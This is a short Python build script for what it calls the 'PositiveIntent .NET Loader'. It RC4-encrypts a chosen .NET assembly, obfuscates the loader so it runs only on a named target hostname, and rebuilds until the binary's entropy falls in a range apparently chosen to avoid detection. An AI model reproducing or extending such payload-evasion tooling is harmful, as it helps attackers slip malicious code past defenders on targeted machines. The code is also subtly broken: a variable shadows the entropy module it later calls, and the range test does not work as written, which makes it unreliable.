import sys
import argparse
from modules import obfuscate
from modules import rc4
from modules import entropy
import subprocess
import numpy
import os

def build():
    entropy = 8
    while(entropy not in numpy.arange(4.5, 5.5)):
        if(os.name == "nt"):
            subprocess.run(["dotnet", "build", os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent.sln")])
        else:
            subprocess.run(["msbuild", os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent.sln")])
        entropy = entropy.run()

if __name__=="__main__":
    parser = argparse.ArgumentParser(description='PositiveIntent .NET Loader')
    parser.add_argument('--file', type=argparse.FileType('rb'),
                        required=True, help='Path to your .NET assembly (e.g. Seeker.exe)')
    parser.add_argument('--hostname', type=str, required=True,
                        help='Restrict execution of loader to hostname')
    args = parser.parse_args()
    obfuscate.run(args.hostname)
    rc4.run(args.file)
    build()
